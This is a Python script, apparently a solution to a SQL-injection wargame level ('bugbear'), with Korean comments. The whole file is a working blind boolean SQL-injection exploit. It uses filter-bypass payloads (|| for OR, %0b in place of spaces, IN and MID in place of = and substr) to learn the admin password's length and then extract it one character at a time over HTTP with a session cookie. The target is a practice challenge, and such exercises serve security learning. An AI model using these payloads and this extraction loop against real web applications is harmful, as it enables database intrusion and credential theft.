import os
from dotenv import load_dotenv
import requests
from tqdm import tqdm

# 상위 디렉토리의 .env 파일 경로
dotenv_path = os.path.join(os.path.dirname(__file__), '..', '.env')

# .env 파일 로드
load_dotenv(dotenv_path)

# 환경변수 가져오기
my_cookie ={ "PHPSESSID" : os.getenv('MY_COOKIE') }

URL = 'https://los.rubiya.kr/chall/bugbear_19ebf8c8106a5323825b5dfa1b07ac1f.php'
param = '?no=1+or+id+LIKE+"admin"+and+pw+LIKE+"0%"%23'

len = 0
print("pw 길이 구하기")

for i in tqdm(range(1,100)):
    param = f'?no=1||id%0bIN%0b(%22admin%22)%26%26LENGTH(pw)%3E{i}'
    res = requests.get(URL+param, cookies=my_cookie)
    if "Hello admin" not in res.text :
        print("length :",i)
        len = i
        break



chars = "0123456789abcdefghijklmnopqrstuvwxyz!@"
ans = ""
print("pw 구하기")
for i in tqdm(range(1,len+1)) :
    for j in chars:
        param = f"?no=1||id%0bIN%0b(\"admin\")%26%26MID(pw,{i},1)IN(\"{j}\")"
        # print(param)
        res = requests.get(URL+param, cookies=my_cookie)
        if "Hello admin" in res.text :
            ans += j
            # print(ans)
            break

print(ans)
param = "?pw="+ans
res = requests.get(URL+param, cookies=my_cookie)

if "BUGBEAR Clear!" in res.text :
    print("Clear!")
    print("answer : ", ans)